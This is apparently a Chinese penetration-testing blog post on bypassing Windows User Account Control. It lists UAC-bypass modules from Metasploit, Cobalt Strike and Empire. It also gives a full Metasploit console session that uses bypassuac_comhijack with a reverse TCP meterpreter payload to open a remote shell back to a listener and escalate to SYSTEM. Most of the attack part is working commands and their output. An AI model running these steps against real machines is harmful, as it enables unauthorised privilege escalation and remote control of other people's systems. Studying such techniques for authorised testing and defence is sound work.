---
title: "Windows 绕过 UAC 策略"
date: 2019-07-12T00:00:00+08:00
draft: false
tags: ['windows','uac']
categories: ['内网渗透']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

UAC 全称 User Access Control, 其作用为在程序进行管理员权限的操作时对用户进行通知, 经确认以后方可才能继续执行操作.

如果是普通用户, UAC 会让你提供管理员用户的账号密码.

如果是管理员, 则会提醒你是否继续该操作. 这样的管理员就称作"受限管理员" (Administrator 用户除外).

<!--more-->

绕过 UAC 的方式很多, 比如 [hfiref0x/UACME](https://github.com/hfiref0x/UACME), 恕本人技术有限, 暂且先提供以下几种比较"方便"的 UAC 绕过方案.

## metasploit

msf 自带九种 bypassuac 模块.

```
exploit/windows/local/bypassuac
exploit/windows/local/bypassuac_injection_winsxs
exploit/windows/local/bypassuac_comhijack
exploit/windows/local/bypassuac_silentcleanup
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/bypassuac_sluihijack
exploit/windows/local/bypassuac_fodhelper
exploit/windows/local/bypassuac_vbs
exploit/windows/local/bypassuac_injection
```

其中 `bypassuac`, `bypassuac_injection` 历史久远, `bypassuac_comhijack` 目前还未修复.

以 `exploit/windows/local/bypassuac_comhijack` 为例.

```
msf5 exploit(multi/handler) > use exploit/windows/local/bypassuac_comhijack                                             msf5 exploit(windows/local/bypassuac_comhijack) > set session 1                                                         session => 1                                                                                                                                                                                                                                                                                  msf5 exploit(windows/local/bypassuac_comhijack) > set payload windows/x64/meterpreter/reverse_tcp                       payload => windows/x64/meterpreter/reverse_tcp                                                                          msf5 exploit(windows/local/bypassuac_comhijack) > set lhost 192.168.1.1                                                 lhost => 192.168.1.1                                                                                                    msf5 exploit(windows/local/bypassuac_comhijack) > run                                                                                                                                                                                           [*] Started reverse TCP handler on 192.168.1.1:4444                                                                     [*] UAC is Enabled, checking level...                                                                                   [+] Part of Administrators group! Continuing...                                                                         [+] UAC is set to Default                                                                                               [+] BypassUAC can bypass this setting, continuing...                                                                    [*] Targeting Event Viewer via HKCU\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931} ...                   [*] Uploading payload to C:\Users\test\AppData\Local\Temp\DCRQHfyu.dll ...                                              [*] Executing high integrity process ...                                                                                [*] Sending stage (206403 bytes) to 192.168.1.99                                                                        [*] Meterpreter session 2 opened (192.168.1.1:4444 -> 192.168.1.99:49164) at 2019-07-12 21:25:32 +0800                                                                                                                                          [*] Cleaining up registry ...

meterpreter > getuid
Server username: DC2\test
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM                                                                          
```

## cobalt strike

cs 自带的 bypassuac 模块与 msf 中的某些模块重复, 添加 [rsmudge/ElevateKit](https://github.com/rsmudge/ElevateKit) 工具包后新增三种 bypassuac 方式, 例如 `uac-wscript`, `uac-token` 等.

![cobaltstrike elevate bypassuac 1](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/2019/cobaltstrike_elevate_bypassuac_1.jpg)

![cobaltstrike elevate bypassuac 2](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/2019/cobaltstrike_elevate_bypassuac_2.jpg)

## empire

empire 中的部分 bypassuac 脚本还是比较新的, 不过全都是以 powershell 方式执行.

```
powershell/privesc/bypassuac
powershell/privesc/bypassuac_eventvwr
powershell/privesc/bypassuac_sdctlbypass
powershell/privesc/bypassuac_wscript
powershell/privesc/bypassuac_env
powershell/privesc/bypassuac_fodhelper
powershell/privesc/bypassuac_tokenmanipulation                                      
```

演示略.